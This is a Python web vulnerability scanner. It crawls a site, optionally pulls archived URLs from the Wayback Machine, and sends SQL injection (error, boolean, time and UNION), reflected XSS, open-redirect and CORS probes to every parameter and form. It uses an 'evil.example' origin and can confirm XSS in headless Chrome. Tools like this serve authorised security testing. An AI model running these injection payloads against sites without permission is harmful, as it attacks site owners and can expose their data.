#!/usr/bin/env python3
"""
scanner_with_cors_full.py

- Crawl (depth)
- Optional Wayback fetch
- SQLi detection (error / boolean / time / union)
- Reflected XSS detection (replacement + append + breakout probe)
- Optional Selenium headless Chrome verification to confirm XSS
- Multithreaded param / form testing
- CORS misconfiguration detection (OPTIONS preflight + GET/POST)
- Open redirect detection & verification
"""

from __future__ import annotations
import argparse
import json
import time
import random
import string
import html
import difflib
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, unquote
from bs4 import BeautifulSoup
import requests
import sys

# Selenium (optional)
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException, WebDriverException
from webdriver_manager.chrome import ChromeDriverManager

# ---------------- Config ----------------
HEADERS = {"User-Agent": "scanner_with_cors_full/1.0"}
DEFAULT_TIMEOUT = 12
DEFAULT_THREADS = 8
DEFAULT_DEPTH = 2
WAYBACK_TIMEOUT = 12
TIME_SLEEP = 5
TIME_THRESHOLD = 3.0
SIMILARITY_THRESHOLD = 0.85
MIN_LEN_DIFF = 40
MAX_UNION_COLUMNS = 8
MAX_PAGES = 3000
MAX_FORMS_DEFAULT = 200
SKIP_EXT = (".pdf", ".png", ".jpg", ".jpeg", ".gif", ".zip", ".rar", ".exe", ".tar", ".gz", ".mp4")

SQL_ERROR_SIGS = [
    "you have an error in your sql syntax", "mysql", "syntax error", "unclosed quotation mark",
    "ora-", "sqlite", "sqlstate", "warning: mysql", "mysql_fetch", "mysql_num_rows",
    "quoted string not properly terminated", "mysql error", "sql error", "syntax to use near"
]

XSS_TEMPLATES = [
    "<script>MARKER()</script>",
    "'\"><img src=x onerror=MARKER()>",
    "\" onmouseover=MARKER() autofocus=\"",
    "\"><svg/onload=MARKER()>",
    "<input autofocus onfocus=MARKER()>"
]

SQL_TIME_TEMPLATE = " AND (SELECT SLEEP({s}))"
SQL_BOOL_TRUE = " AND (1=1)"
SQL_BOOL_FALSE = " AND (1=2)"
SQL_ERR_INJECT = "'"

CORS_TEST_ORIGIN = "https://evil.example"  # attacker-controlled Origin for tests
ORIGIN_FOR_OPEN = "https://evil.example"   # base for open-redirect verification

# ---------------- Globals ----------------
session = requests.Session()
session.headers.update(HEADERS)
print_lock = threading.Lock()

def safe_print(*a, **k):
    with print_lock:
        print(*a, **k, flush=True)

# ---------------- Helpers ----------------
def fetch(url: str, method: str = "GET", params=None, data=None, headers: dict | None = None, timeout: int = DEFAULT_TIMEOUT, allow_redirects: bool = True):
    """
    Common fetch wrapper. Added allow_redirects param (default True) so callers can
    ask for raw Location header processing when needed.
    """
    hdrs = dict(session.headers)
    if headers:
        hdrs.update(headers)
    try:
        if method.upper() == "GET":
            return session.get(url, params=params, headers=hdrs, timeout=timeout, allow_redirects=allow_redirects)
        return session.post(url, params=params, data=data, headers=hdrs, timeout=timeout, allow_redirects=allow_redirects)
    except Exception:
        return None

def normalize_text(t: str) -> str:
    if not t:
        return ""
    try:
        t2 = unquote(t)
    except Exception:
        t2 = t
    return html.unescape(t2)

def similarity(a: str, b: str) -> float:
    return difflib.SequenceMatcher(None, a, b).ratio()

def gen_token(n: int = 6) -> str:
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))

def is_numeric(v: str) -> bool:
    try:
        int(v)
        return True
    except Exception:
        return False

def looks_binary(url: str) -> bool:
    s = url.lower()
    return any(s.endswith(e) for e in SKIP_EXT)

def build_url_with_params(base: str, params: dict) -> str:
    parsed = urlparse(base)
    return parsed._replace(query=urlencode(params, doseq=True)).geturl()

# ---------------- Crawler ----------------
def crawl(seed: str, depth: int = DEFAULT_DEPTH, max_pages: int = MAX_PAGES):
    parsed_seed = urlparse(seed)
    domain = parsed_seed.netloc
    visited = set()
    queue = [(seed, 0)]
    links = set()
    param_links = set()
    forms = []

    while queue and len(visited) < max_pages:
        url, lvl = queue.pop(0)
        if url in visited or lvl > depth:
            continue
        visited.add(url)
        safe_print(f"[Crawl] Visiting: {url} (depth {lvl})")
        if looks_binary(url):
            links.add(url)
            continue
        r = fetch(url)
        if not r or not getattr(r, "text", None):
            continue
        ctype = r.headers.get("content-type", "")
        if "text/html" not in ctype:
            links.add(url)
            continue
        soup = BeautifulSoup(r.text, "lxml")
        # anchors
        for a in soup.find_all("a", href=True):
            href = urljoin(url, a['href'].split("#")[0])
            parsed = urlparse(href)
            if parsed.netloc and parsed.netloc != domain:
                continue
            if href.endswith("/") and href != seed:
                href = href.rstrip("/")
            if href not in links:
                safe_print(f"  [Link] {href}")
            links.add(href)
            if parsed.query:
                param_links.add(href)
            if href not in visited and lvl + 1 <= depth and not looks_binary(href):
                queue.append((href, lvl + 1))
        # forms
        for form in soup.find_all("form"):
            action = form.get("action") or url
            action = urljoin(url, action)
            method = (form.get("method") or "GET").upper()
            inputs = []
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                itype = (inp.get("type") or "").lower()
                if name:
                    inputs.append({"name": name, "type": itype, "value": inp.get("value", "")})
            forms.append({"page": url, "action": action, "method": method, "inputs": inputs, "raw_html": str(form)})
            safe_print(f"  [Form] {action} ({method}) params={[i['name'] for i in inputs]}")
    return links, param_links, forms

# ---------------- Wayback ----------------
def fetch_wayback(domain: str, limit: int = 50):
    api = f"https://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey"
    try:
        r = session.get(api, timeout=WAYBACK_TIMEOUT)
        if r.status_code != 200:
            safe_print("[-] Wayback returned status", r.status_code)
            return set()
        data = r.json()
        urls = set()
        for row in data[1:limit + 1]:
            if isinstance(row, list) and row:
                urls.add(row[0])
        safe_print(f"[*] Wayback: fetched {len(urls)} URLs")
        return urls
    except Exception as e:
        safe_print("[-] Wayback fetch failed:", e)
        return set()

# ---------------- SQLi detectors ----------------
def detect_error_based(base_url: str, param: str, base_params: dict):
    p = dict(base_params)
    val = p.get(param, "")
    p[param] = f"{val}{SQL_ERR_INJECT}"
    r = fetch(base_url, params=p)
    if r and getattr(r, "text", None):
        low = r.text.lower()
        for sig in SQL_ERROR_SIGS:
            if sig in low:
                return {"type": "sqli_error", "url": base_url, "param": param, "payload": p[param], "evidence": sig}
    return None

def detect_time_based(base_url: str, param: str, base_params: dict, sleep: int = TIME_SLEEP):
    p_base = dict(base_params)
    val = p_base.get(param, "")
    p_time = dict(base_params)
    if is_numeric(val):
        p_time[param] = f"{val}{SQL_TIME_TEMPLATE.format(s=sleep)}"
    else:
        p_time[param] = f"{val}'{SQL_TIME_TEMPLATE.format(s=sleep)}"
    r_base1 = fetch(base_url, params=p_base)
    r_base2 = fetch(base_url, params=p_base)
    if not r_base1 or not r_base2:
        return None
    t_base = (r_base1.elapsed.total_seconds() + r_base2.elapsed.total_seconds()) / 2.0
    r_t = fetch(base_url, params=p_time, timeout=sleep + DEFAULT_TIMEOUT)
    if not r_t:
        return None
    t_time = r_t.elapsed.total_seconds()
    if (t_time - t_base) > TIME_THRESHOLD:
        return {"type": "sqli_time", "url": base_url, "param": param, "payload": p_time[param], "delta": (t_time - t_base)}
    return None

def detect_boolean_based(base_url: str, param: str, base_params: dict):
    val = base_params.get(param, "")
    p_true = dict(base_params); p_false = dict(base_params)
    if is_numeric(val):
        p_true[param] = f"{val}{SQL_BOOL_TRUE}"
        p_false[param] = f"{val}{SQL_BOOL_FALSE}"
    else:
        p_true[param] = f"{val}'{SQL_BOOL_TRUE}"
        p_false[param] = f"{val}'{SQL_BOOL_FALSE}"
    r_true = fetch(base_url, params=p_true)
    r_false = fetch(base_url, params=p_false)
    if not r_true or not r_false:
        return None
    sim = similarity(normalize_text(r_true.text), normalize_text(r_false.text))
    len_diff = abs(len(r_true.text) - len(r_false.text))
    if sim < SIMILARITY_THRESHOLD and len_diff > MIN_LEN_DIFF:
        return {"type": "sqli_boolean", "url": base_url, "param": param, "sim": sim, "len_diff": len_diff, "payloads": {"true": p_true[param], "false": p_false[param]}}
    return None

def detect_union_based(base_url: str, param: str, base_params: dict, max_cols: int = MAX_UNION_COLUMNS):
    token = gen_token(6)
    hex_token = token.encode().hex()
    for cols in range(1, max_cols + 1):
        parts = ["NULL"] * cols
        parts[-1] = "0x" + hex_token
        union_payload = f" UNION ALL SELECT {','.join(parts)} -- "
        p = dict(base_params)
        val = p.get(param, "")
        if is_numeric(val):
            p[param] = f"-1{union_payload}"
        else:
            p[param] = f"{val}'{union_payload}"
        r = fetch(base_url, params=p)
        if r and getattr(r, "text", None) and token in normalize_text(r.text):
            return {"type": "sqli_union", "url": base_url, "param": param, "cols": cols, "payload": p[param], "token": token}
    return None

# ---------------- XSS helpers ----------------
def find_payload_context(response_text: str, payload: str):
    """
    Return ('script', tag) if payload found inside <script> content,
           ('attr', (tagname, attr)) if payload found inside an attribute that could execute,
           (None, None) otherwise
    """
    if not response_text or payload not in response_text:
        return (None, None)
    soup = BeautifulSoup(response_text, "lxml")
    # check script blocks
    for script in soup.find_all("script"):
        text = script.string or ""
        if payload in text:
            return ("script", "script")
    # check attributes
    risky_tags = {"img", "svg", "iframe", "script", "body", "input", "a", "form"}
    for tag in soup.find_all(True):
        for aname, aval in tag.attrs.items():
            aval_str = " ".join(aval) if isinstance(aval, list) else str(aval)
            if payload in aval_str:
                if aname.lower().startswith("on"):
                    return ("attr", (tag.name, aname))
                if aname.lower() in ("src", "href") and tag.name.lower() in risky_tags:
                    if "javascript:" in aval_str.lower() or payload in aval_str:
                        return ("attr", (tag.name, aname))
    return (None, None)

def attempt_simple_breakout(base_url: str, param: str, params: dict, tpl: str):
    """
    Inject a marker-based variant and look for marker presence in normalized response (cheap probe).
    Try both replacement and append variants.
    """
    marker = gen_token(6)
    if "MARKER()" in tpl:
        probe = tpl.replace("MARKER()", f"alert{marker}()")
    else:
        probe = tpl.replace("MARKER", f"alert{marker}")
    # replacement
    p = dict(params); p[param] = probe
    r = fetch(base_url, params=p)
    if r and getattr(r, "text", None):
        norm = normalize_text(r.text)
        if probe in norm or f"alert{marker}" in norm:
            return {"type": "xss_breakout", "url": build_url_with_params(base_url, p), "param": param, "payload": probe, "marker": marker}
    # append
    p2 = dict(params); p2[param] = (p2.get(param, "") or "") + probe
    r2 = fetch(base_url, params=p2)
    if r2 and getattr(r2, "text", None):
        norm2 = normalize_text(r2.text)
        if probe in norm2 or f"alert{marker}" in norm2:
            return {"type": "xss_breakout", "url": build_url_with_params(base_url, p2), "param": param, "payload": probe, "marker": marker}
    return None

def check_reflected_xss(base_url: str, param: str, params: dict):
    findings = []
    for tpl in XSS_TEMPLATES:
        marker = gen_token(6)
        if "MARKER()" in tpl:
            payload = tpl.replace("MARKER()", f"alert{marker}()")
        else:
            payload = tpl.replace("MARKER", f"alert{marker}")
        # try replace then append
        for mode in ("replace", "append"):
            p = dict(params)
            if mode == "replace":
                p[param] = payload
            else:
                p[param] = (p.get(param, "") or "") + payload
            full_url = build_url_with_params(base_url, p)
            r = fetch(base_url, params=p)
            if not r or not getattr(r, "text", None):
                continue
            norm = normalize_text(r.text)
            if payload not in norm:
                continue
            ctx, info = find_payload_context(norm, payload)
            if ctx == "script":
                findings.append({"type": "xss_reflected", "url": full_url, "param": param, "payload": payload, "evidence": "script_tag"})
                break
            if ctx == "attr":
                findings.append({"type": "xss_reflected", "url": full_url, "param": param, "payload": payload, "evidence": f"attr:{info[1]}"})
                break
            # attempt breakout
            bo = attempt_simple_breakout(base_url, param, params, tpl)
            if bo:
                bo["evidence"] = "breakout_success"
                findings.append(bo)
                break
    # dedupe
    unique = []
    seen = set()
    for f in findings:
        key = (f.get("url"), f.get("param"), f.get("payload"), f.get("evidence"))
        if key in seen:
            continue
        seen.add(key); unique.append(f)
    return unique

# ---------------- Open redirect detection ----------------
def detect_open_redirect(base_url: str, param: str, base_params: dict):
    """
    Injects a unique attacker URL (ORIGIN_FOR_OPEN + token) into the parameter and verifies:
      - Location header on non-follow (allow_redirects=False)
      - final URL after redirects (allow_redirects=True)
      - presence in body of meta refresh or JS redirects referencing the injected URL
    """
    findings = []
    token = gen_token(8)
    attacker_url = f"{ORIGIN_FOR_OPEN}/{token}"
    p_replace = dict(base_params); p_replace[param] = attacker_url

    try:
        # 1) HEAD/Omitted redirect-follow to catch Location header
        r_no_follow = fetch(base_url, params=p_replace, allow_redirects=False)
        if r_no_follow and 300 <= getattr(r_no_follow, "status_code", 0) < 400:
            loc = r_no_follow.headers.get("Location") or r_no_follow.headers.get("location")
            if loc and attacker_url in loc:
                findings.append({"type": "open_redirect", "url": base_url, "param": param, "payload": attacker_url, "evidence": "Location header", "location": loc})
                return findings  # strong confirmation

        # 2) Follow redirects and check final URL
        r_follow = fetch(base_url, params=p_replace, allow_redirects=True)
        if r_follow:
            final_url = getattr(r_follow, "url", "")
            # Some apps will return final_url with query encoded; check presence
            if final_url and attacker_url in final_url:
                findings.append({"type": "open_redirect", "url": base_url, "param": param, "payload": attacker_url, "evidence": "final_url", "final": final_url})
                return findings

        # 3) Look for meta refresh or JS redirects in the response body
        # Check both replacement and append strategies
        for mode in ("replace", "append"):
            p = dict(base_params)
            if mode == "replace":
                p[param] = attacker_url
            else:
                p[param] = (p.get(param, "") or "") + attacker_url
            r = fetch(base_url, params=p)
            if not r or not getattr(r, "text", None):
                continue
            body = normalize_text(r.text)
            # meta refresh
            if 'meta' in body.lower() and 'refresh' in body.lower() and attacker_url in body:
                findings.append({"type": "open_redirect", "url": base_url, "param": param, "payload": attacker_url, "evidence": "meta_refresh", "body_snippet": body[:300]})
                break
            # JS redirects (simple heuristics)
            # Look for location.href = "attacker", window.location = 'attacker', location.replace('attacker')
            js_patterns = [f"location.href", f"window.location", f"location.replace", f"window.location.replace"]
            if attacker_url in body:
                for pat in js_patterns:
                    if pat in body:
                        findings.append({"type": "open_redirect", "url": base_url, "param": param, "payload": attacker_url, "evidence": f"js:{pat}", "body_snippet": body[:300]})
                        break
                if findings:
                    break
    except Exception as e:
        safe_print("[-] Exception in detect_open_redirect:", e)
    return findings

# ---------------- Param tester ----------------
def test_param_url(url: str, time_sleep: int = TIME_SLEEP, time_threshold: float = TIME_THRESHOLD, max_union: int = MAX_UNION_COLUMNS):
    parsed = urlparse(url)
    base = parsed._replace(query=None).geturl()
    qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}
    results = []
    if not qs:
        return results
    for param in list(qs.keys()):
        try:
            e = detect_error_based(base, param, qs)
            if e:
                results.append(e); safe_print("[!!] Detected error-based:", e)
            t = detect_time_based(base, param, qs, sleep=time_sleep)
            if t:
                results.append(t); safe_print("[!!] Detected time-based:", t)
            b = detect_boolean_based(base, param, qs)
            if b:
                results.append(b); safe_print("[!!] Detected boolean-based:", b)
            u = detect_union_based(base, param, qs, max_cols=max_union)
            if u:
                results.append(u); safe_print("[!!] Detected union-based:", u)
            # open redirect check
            orr = detect_open_redirect(base, param, qs)
            if orr:
                for o in orr:
                    results.append(o)
                    safe_print("[!!] Open redirect candidate:", o)
            x = check_reflected_xss(base, param, qs)
            if x:
                # annotate XSS candidates if SQLi issues exist for same param
                sql_errs = [r for r in results if r.get("type","").startswith("sqli") and r.get("param")==param and r.get("url")==base]
                for xi in x:
                    if sql_errs:
                        xi.setdefault("notes", []).append({"sql_errors_found": [se.get("evidence") or se.get("type") for se in sql_errs]})
                        xi["priority"] = "sqli-first"
                        safe_print("[!!] XSS candidate but SQL errors also present — marking SQL priority:", xi.get("url"))
                    else:
                        safe_print("[!!] XSS candidate (high-confidence):", xi.get("url"), xi.get("evidence"))
                    results.append(xi)
        except Exception as ex:
            safe_print("[-] Exception testing param", url, param, ex)
    return results

# ---------------- Form tester ----------------
def is_interesting_form(form: dict) -> bool:
    inputs = form.get("inputs", [])
    visible = [i for i in inputs if i["type"] not in ("hidden", "submit", "button")]
    if not visible:
        return False
    names = " ".join(i["name"].lower() for i in inputs if i.get("name"))
    if "captcha" in names or "recaptcha" in names:
        return False
    return True

def test_form(form: dict, time_sleep: int = TIME_SLEEP, time_threshold: float = TIME_THRESHOLD, max_union: int = MAX_UNION_COLUMNS):
    findings = []
    action = form.get("action")
    method = form.get("method", "GET").upper()
    inputs = form.get("inputs", [])
    base = {}
    for i in inputs:
        if not i.get("name"):
            continue
        base[i["name"]] = i.get("value") or "1"
    for inp in inputs:
        nm = inp.get("name")
        if not nm:
            continue
        try:
            # error-based
            d_err = dict(base); d_err[nm] = d_err.get(nm, "") + SQL_ERR_INJECT
            r_err = fetch(action, method=method, params=None if method != "GET" else d_err, data=d_err if method != "GET" else None)
            if r_err and getattr(r_err, "text", None):
                low = r_err.text.lower()
                for sig in SQL_ERROR_SIGS:
                    if sig in low:
                        findings.append({"type": "sqli_error", "url": action, "param": nm, "payload": d_err[nm], "context": "form", "evidence": sig})
            # time-based
            d_time = dict(base)
            if is_numeric(base.get(nm, "")):
                d_time[nm] = f"{base.get(nm)}{SQL_TIME_TEMPLATE.format(s=time_sleep)}"
            else:
                d_time[nm] = f"{base.get(nm)}'{SQL_TIME_TEMPLATE.format(s=time_sleep)}"
            r_b1 = fetch(action, method=method, params=None if method != "GET" else base, data=base if method != "GET" else None)
            r_b2 = fetch(action, method=method, params=None if method != "GET" else base, data=base if method != "GET" else None)
            if r_b1 and r_b2:
                t_base = (r_b1.elapsed.total_seconds() + r_b2.elapsed.total_seconds()) / 2.0
                r_t = fetch(action, method=method, params=None if method != "GET" else d_time, data=d_time if method != "GET" else None, timeout=time_sleep + DEFAULT_TIMEOUT)
                if r_t and (r_t.elapsed.total_seconds() - t_base) > time_threshold:
                    findings.append({"type": "sqli_time", "url": action, "param": nm, "payload": d_time[nm], "context": "form"})
            # boolean-based
            d_true = dict(base); d_false = dict(base)
            if is_numeric(base.get(nm, "")):
                d_true[nm] = f"{base.get(nm)}{SQL_BOOL_TRUE}"; d_false[nm] = f"{base.get(nm)}{SQL_BOOL_FALSE}"
            else:
                d_true[nm] = f"{base.get(nm)}'{SQL_BOOL_TRUE}"; d_false[nm] = f"{base.get(nm)}'{SQL_BOOL_FALSE}"
            r_true = fetch(action, method=method, params=None if method != "GET" else d_true, data=d_true if method != "GET" else None)
            r_false = fetch(action, method=method, params=None if method != "GET" else d_false, data=d_false if method != "GET" else None)
            if r_true and r_false:
                sim = similarity(normalize_text(r_true.text), normalize_text(r_false.text))
                if sim < SIMILARITY_THRESHOLD and abs(len(r_true.text) - len(r_false.text)) > MIN_LEN_DIFF:
                    findings.append({"type": "sqli_boolean", "url": action, "param": nm, "context": "form"})
            # Open-redirect test for forms (POST/GET)
            try:
                orr = detect_open_redirect(action, nm, base)
                if orr:
                    for o in orr:
                        o["context"] = "form"
                        findings.append(o)
                        safe_print("[!!] Open redirect candidate (form):", o)
            except Exception:
                pass
            # XSS (form): replacement and append
            for tpl in XSS_TEMPLATES:
                marker = gen_token(6)
                if "MARKER()" in tpl:
                    payload = tpl.replace("MARKER()", f"alert{marker}()")
                else:
                    payload = tpl.replace("MARKER", f"alert{marker}")
                # replacement
                d_x = dict(base); d_x[nm] = payload
                r_x = fetch(action, method=method, params=None if method != "GET" else d_x, data=d_x if method != "GET" else None)
                if r_x and getattr(r_x, "text", None):
                    norm_x = normalize_text(r_x.text)
                    if payload in norm_x:
                        ctx, info = find_payload_context(norm_x, payload)
                        if ctx == "script":
                            findings.append({"type": "xss_reflected", "url": build_url_with_params(action, d_x), "param": nm, "payload": payload, "context": "form", "evidence": "script_tag"})
                            continue
                        if ctx == "attr":
                            findings.append({"type": "xss_reflected", "url": build_url_with_params(action, d_x), "param": nm, "payload": payload, "context": "form", "evidence": f"attr:{info[1]}"})
                            continue
                        bo = attempt_simple_breakout(action, nm, base, tpl)
                        if bo:
                            bo["context"] = "form"; bo["evidence"] = "breakout_success"
                            findings.append(bo)
                            continue
                # append
                d_x2 = dict(base); d_x2[nm] = (d_x2.get(nm, "") or "") + payload
                r_x2 = fetch(action, method=method, params=None if method != "GET" else d_x2, data=d_x2 if method != "GET" else None)
                if r_x2 and getattr(r_x2, "text", None):
                    norm_x2 = normalize_text(r_x2.text)
                    if payload in norm_x2:
                        ctx2, info2 = find_payload_context(norm_x2, payload)
                        if ctx2 == "script":
                            findings.append({"type": "xss_reflected", "url": build_url_with_params(action, d_x2), "param": nm, "payload": payload, "context": "form", "evidence": "script_tag"})
                            continue
                        if ctx2 == "attr":
                            findings.append({"type": "xss_reflected", "url": build_url_with_params(action, d_x2), "param": nm, "payload": payload, "context": "form", "evidence": f"attr:{info2[1]}"})
                            continue
                        bo2 = attempt_simple_breakout(action, nm, base, tpl)
                        if bo2:
                            bo2["context"] = "form"; bo2["evidence"] = "breakout_success"
                            findings.append(bo2)
                            continue
        except Exception as ex:
            safe_print("[-] Exception testing form param", nm, ex)
    # dedupe
    uniq = []
    seen = set()
    for f in findings:
        key = (f.get("url"), f.get("param"), f.get("payload"), f.get("evidence"))
        if key in seen:
            continue
        seen.add(key); uniq.append(f)
    return uniq

# ---------------- Selenium verification ----------------
def make_selenium_driver(headless=True):
    opts = Options()
    if headless:
        try:
            opts.add_argument("--headless=new")
        except Exception:
            opts.add_argument("--headless")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--log-level=3")
    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=opts)
        driver.set_page_load_timeout(30)
        return driver
    except WebDriverException as e:
        safe_print("[-] Selenium WebDriver error:", e)
        return None

def verify_xss_with_browser_candidates(candidates: list, driver: webdriver.Chrome, wait_seconds: int = 2):
    verified = []
    for candidate in candidates:
        try:
            url = candidate.get("url")
            payload = candidate.get("payload")
            safe_print("[*] Browser verify loading:", url)
            try:
                driver.get(url)
            except TimeoutException:
                pass
            time.sleep(wait_seconds)
            # alert check
            try:
                alert = driver.switch_to.alert
                txt = alert.text
                safe_print("[+] Browser alert detected:", txt)
                try:
                    alert.dismiss()
                except Exception:
                    pass
                candidate["verified_by_browser"] = "alert"
                verified.append(candidate)
                continue
            except Exception:
                pass
            page_source = driver.page_source or ""
            page_norm = normalize_text(page_source)
            # annotate SQL error if present (helps explain mixed results)
            for sig in SQL_ERROR_SIGS:
                if sig in page_norm.lower():
                    candidate["verified_by_browser"] = "sql_error_in_page"
                    candidate["priority"] = "sqli-first"
                    verified.append(candidate)
                    break
            if candidate in verified:
                continue
            if payload and payload in page_norm:
                candidate["verified_by_browser"] = "marker_in_dom"
                verified.append(candidate)
                continue
            # limited attribute search
            try:
                elems = driver.find_elements(By.XPATH, "//*")
                for el in elems[:400]:
                    try:
                        attrs = driver.execute_script(
                            "var items = {}; for (var i=0;i<arguments[0].attributes.length;i++){var a=arguments[0].attributes[i]; items[a.name]=a.value;} return items;",
                            el)
                        for k, v in (attrs or {}).items():
                            if payload in (v or ""):
                                candidate["verified_by_browser"] = f"attr:{k}"
                                verified.append(candidate)
                                raise StopIteration
                    except StopIteration:
                        break
                    except Exception:
                        continue
            except Exception:
                pass
        except Exception as e:
            safe_print("[-] verify_xss_with_browser error:", e)
    return verified

# ---------------- CORS tester ----------------
def test_cors(url: str):
    findings = []
    try:
        origin = CORS_TEST_ORIGIN
        headers_preflight = {
            "Origin": origin,
            "Access-Control-Request-Method": "GET",
            "Access-Control-Request-Headers": "X-Requested-With, Content-Type"
        }
        # OPTIONS preflight
        r_options = fetch(url, method="OPTIONS", headers=headers_preflight)
        if r_options:
            acao = r_options.headers.get("Access-Control-Allow-Origin")
            acac = r_options.headers.get("Access-Control-Allow-Credentials", "").lower()
            acam = r_options.headers.get("Access-Control-Allow-Methods", "")
            acah = r_options.headers.get("Access-Control-Allow-Headers", "")
            if acao:
                acao_val = acao.strip()
                if acao_val == "*" and acac == "true":
                    findings.append({"type": "cors_vuln", "url": url, "issue": "Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true"})
                elif acao_val == origin:
                    findings.append({"type": "cors_vuln", "url": url, "issue": "Access-Control-Allow-Origin reflects attacker Origin (preflight)"})
                else:
                    findings.append({"type": "cors_info", "url": url, "acao": acao_val, "acac": acac, "acam": acam, "acah": acah})
        # GET/POST with Origin header
        for method in ("GET", "POST"):
            r = fetch(url, method=method, headers={"Origin": origin})
            if not r:
                continue
            acao = r.headers.get("Access-Control-Allow-Origin")
            acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
            if acao:
                acao_val = acao.strip()
                if acao_val == "*" and acac == "true":
                    findings.append({"type": "cors_vuln", "url": url, "issue": f"{method} Access-Control-Allow-Origin: * with credentials"})
                elif acao_val == origin:
                    findings.append({"type": "cors_vuln", "url": url, "issue": f"{method} Access-Control-Allow-Origin reflects attacker Origin"})
    except Exception as e:
        safe_print("[-] CORS test failed for", url, e)
    return findings

# ---------------- Orchestration / CLI ----------------
def scan(seed: str, depth: int = DEFAULT_DEPTH, threads: int = DEFAULT_THREADS, wayback_limit: int = 0, max_forms: int = MAX_FORMS_DEFAULT, out_file: str = "scan_results.json", verify_xss: bool = False):
    parsed = urlparse(seed); domain = parsed.netloc
    safe_print("[*] Crawling site (live)...")
    links, param_links, forms = crawl(seed, depth=depth)
    safe_print(f"[*] Crawl complete: found {len(links)} links, {len(param_links)} param-links, {len(forms)} forms")

    wb = set()
    if wayback_limit and wayback_limit > 0:
        wb = fetch_wayback(domain, limit=wayback_limit)

    all_links = set(links) | set(wb)
    param_urls = [u for u in all_links if urlparse(u).query]

    safe_print(f"[*] Total unique links (live+wb): {len(all_links)}")
    safe_print(f"[*] Parameterized URLs to test: {len(param_urls)}")

    try:
        with open("urls.txt", "w") as fh:
            for u in sorted(all_links):
                fh.write(u + "\n")
        safe_print("[*] Saved URLs to urls.txt")
    except Exception as e:
        safe_print("[-] Failed to save urls:", e)

    findings = []

    # Parameter tests (multithreaded)
    safe_print(f"[*] Starting parameter tests with {threads} threads ...")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(test_param_url, u): u for u in param_urls}
        for fut in as_completed(futures):
            u = futures[fut]
            try:
                res = fut.result()
                if res:
                    for r in res:
                        findings.append(r)
                        safe_print("[!!] Param finding:", r)
            except Exception as e:
                safe_print("[-] Exception testing param URL", u, e)

    # Form tests (multithreaded)
    interesting_forms = [f for f in forms if is_interesting_form(f)]
    if max_forms and max_forms > 0:
        interesting_forms = interesting_forms[:max_forms]
    safe_print(f"[*] Testing {len(interesting_forms)} forms (threads={threads}) ...")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(test_form, f): f for f in interesting_forms}
        for fut in as_completed(futures):
            try:
                res = fut.result()
                if res:
                    for r in res:
                        findings.append(r)
                        safe_print("[!!] Form finding:", r)
            except Exception as e:
                safe_print("[-] Exception testing form", e)

    # CORS tests (multithreaded)
    safe_print("[*] Starting CORS misconfiguration checks ...")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(test_cors, u): u for u in all_links}
        for fut in as_completed(futures):
            u = futures[fut]
            try:
                res = fut.result()
                if res:
                    for r in res:
                        findings.append(r)
                        safe_print("[!!] CORS finding:", r)
            except Exception as e:
                safe_print("[-] Exception testing CORS for URL", u, e)

    # Browser verification (optional)
    if verify_xss:
        # gather xss-like candidates
        xss_candidates = [f for f in findings if f.get("type","").startswith("xss") or f.get("type","")=="xss_breakout"]
        if xss_candidates:
            safe_print(f"[*] Browser verification enabled: verifying {len(xss_candidates)} XSS candidates (this may be slow)...")
            driver = make_selenium_driver(headless=True)
            if not driver:
                safe_print("[-] Failed to create Selenium driver; skipping verification")
            else:
                verified = verify_xss_with_browser_candidates(xss_candidates, driver)
                for v in verified:
                    safe_print("[+] Verified XSS by browser:", v)
                driver.quit()
                # merge verified markers (we keep original findings, and annotation added)
                for v in verified:
                    findings.append(v)

    # Save results
    out = {"seed": seed,
           "meta": {"links": len(all_links), "param_urls": len(param_urls), "forms_tested": len(interesting_forms)},
           "findings": findings,
           "time": time.strftime("%Y-%m-%d %H:%M:%S")}
    try:
        with open(out_file, "w") as fh:
            json.dump(out, fh, indent=2)
        safe_print(f"[*] Results saved to {out_file}. Findings count: {len(findings)}")
    except Exception as e:
        safe_print("[-] Failed to write results:", e)

# ---------------- CLI ----------------
def main():
    parser = argparse.ArgumentParser(prog="scanner_with_cors_full.py")
    parser.add_argument("-u", "--url", required=True, help="Seed URL")
    parser.add_argument("--depth", type=int, default=DEFAULT_DEPTH, help="Crawl depth")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Worker threads")
    parser.add_argument("--wayback", type=int, default=0, help="Wayback results to fetch (0 to skip, >0 to fetch N)")
    parser.add_argument("--max-forms", type=int, default=MAX_FORMS_DEFAULT, help="Max forms to test (0 = all)")
    parser.add_argument("--out", default="scan_results.json", help="Output JSON file")
    parser.add_argument("--verify-xss", action="store_true", help="Use headless browser (Selenium) to verify XSS candidates")
    parser.add_argument("--time-sleep", type=int, default=TIME_SLEEP, help="Seconds to sleep for time-based checks")
    parser.add_argument("--time-threshold", type=float, default=TIME_THRESHOLD, help="Delta threshold for time-based checks")
    parser.add_argument("--max-union", type=int, default=MAX_UNION_COLUMNS, help="Max UNION columns to try")
    args = parser.parse_args()

    safe_print("[*] Starting scanner_with_cors_full.py")
    scan(args.url, depth=args.depth, threads=args.threads, wayback_limit=args.wayback, max_forms=args.max_forms, out_file=args.out, verify_xss=args.verify_xss)

if __name__ == "__main__":
    main()
